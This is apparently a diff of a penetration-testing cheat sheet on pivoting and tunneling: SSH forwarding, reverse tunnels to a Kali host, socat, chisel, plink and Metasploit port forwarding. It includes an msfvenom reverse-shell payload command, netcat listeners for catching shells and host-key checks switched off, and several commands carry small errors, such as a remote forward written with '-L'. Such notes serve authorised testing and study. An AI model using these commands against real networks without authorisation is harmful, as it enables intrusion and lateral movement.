@@ -12,36 +12,32 @@ Not much here yet...please feel free to contribute at [my GitHub page](https://g
 
 ## SSH Tunneling 101
 
-<pre class="language-bash"><code class="lang-bash"># SSH local port forward to reach  an_internal_server_ip:port via server_ip
+```bash
+# SSH local port forward to reach  an_internal_server_ip:port via server_ip
 ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
 # Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only
 
 # dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
 ssh tunneler@server_ip -p 2222 -D 1080 
-
-# next config proxychains socks4a localhost 1080; 
-proxychains curl http://any_internal_server_ip/ #was reachable from server_ip only
+# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only
 
 # ProxyJump ssh to an_internal_host via ssh server_ip
-ssh -J tunneler@server_ip:2222 faruser@an_internal_host # which is only accessible from server_ip
+ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip
 
 # SSH remote port forward to send traffic back to our local port from a port of server_ip
-ssh faruser@server_ip -p 2222 -L 58671:localhost:1234
+ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
 # this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example
 
 # Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
 ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
-<strong>
-</strong><strong># next config proxychains socks4a localhost 1080; 
-</strong><strong>proxychains curl http://any_internal_server_ip/ #was reachable from 2nd_box only
-</strong>
-# bypass first time prompt when have non-interactive shell
-ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only
 
-</code></pre>
+# bypass first time prompt when have non-interactive shell
+
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+```
 
 ### SSH reverse tunneling
-
 ```bash
 ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57
 
@@ -50,7 +46,7 @@ ps -C ssh
 kill -9 <pid>
 ```
 
-### **If you already have an SSH session**
+#### If you already have an SSH session
 
 ```bash
 -R 8081:172.24.0.2:80 # (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
@@ -62,12 +58,13 @@ kill -9 <pid>
 # <KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
 # run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it
 
-#For reverse shell:
+
+For reverse shell:
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell
-#Run it on 2nd remote target to get a shell on Kali
+Run it on 2nd remote target to get a shell on Kali
 ```
 
-### **If you don't have an SSH session**
+#### If you didn't have an SSH session
 
 First, SSH to your Kali from target machine
 
@@ -75,12 +72,49 @@ On Kali:
 
 ```bash
 service ssh start 
-# add a user, give it /bin/false in /etc/passwd as the login shell
+# "add a user, give it /bin/false in /etc/passwd"
 ssh - -R 12345:192.168.122.228:5986 test@10.1.1.1
 ```
 
-### Using Metasploit
+## Port Forwarding (Single port to one port)
 
+### Using Socat
+For linux
+
+Forward your 8083 to 10.39.0.2:443
+
+```bash
+./socat TCP4-LISTEN:8083,fork TCP4:10.39.0.2:443
+```
+
+### Using Chisel
+Most platforms
+
+Remote static tunnels "port to port":
+
+```bash
+#On Kali "reverse proxy listener":
+./chisel server -p 8000 -reverse
+
+#General command:
+./chisel client $YOUR_IP:$YOUR_CHISEL_SERVER_PORT L/R:[$YOUR_LOCAL_IP]:$TUNNEL_LISTENING_PORT:$TUNNEL_TARGET:$TUNNEL_PORT
+```
+
+#### Remote tunnels "access IP:PORT you couldn't access before":
+
+```bash
+#On Target:
+./chisel client 10.1.1.1:8000 R:127.0.0.1:8001:172.19.0.3:80
+```
+
+#### Local tunnels "listen on the target for something, and send it to us":
+
+```bash
+#On Target:
+./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003
+```
+
+### Using Metasploit
 Get meterpreter session, then:
 
 ```bash
@@ -88,15 +122,27 @@ portfwd add -l 4445 -p 4443 -r 10.1.1.1
 # Use -R to make it reverse
 ```
 
-## Using DYNAMIC Port Forwarding ("one port to any")
+### Using Plink.exe
+Just like SSH, but Windows only. Part of the Putty toolset.
 
-*   setup proxychains with socks5 on 127.0.0.1:1080
-
-    * Or set up socks5 proxy on firefox
-
-    > For nmap use `-Pn -sT` or use tcp scanner in msf
-
+```bash
+#On Attacker
+service ssh start 
+cp /usr/share/windows-binaries/plink.exe #to the target machine
 ```
+
+```bash
+#On Target: 
+plink.exe 10.10.10.123 -P 22 -C -N -L 0.0.0.0:4445:10.10.10.123:4443 -l $KALIUSER -pw $PASS
+```
+
+## Dynamic Port Forwarding (Single port to any remote port)
+
+* setup proxychains with socks5 on 127.0.0.1:1080
+  * Or set up socks5 proxy on firefox
+  > For nmap use `-Pn -sT` or use tcp scanner in msf
+
+```sh
 ssh -i bobs.key -p 2222 bob@10.10.10.123 -D1080
 ```
 
@@ -116,7 +162,7 @@ ssh -i bobs.key -p 2222 bob@10.10.10.123 -D1080
 
 ### Using Metasploit
 
-* Get meterpreter session on one of the dual homed machines
+* Get meterpreter session
 * Auto route (multi/manage/autoroute)
 * Start socks proxy (auxiliary/server/socks4a)
 
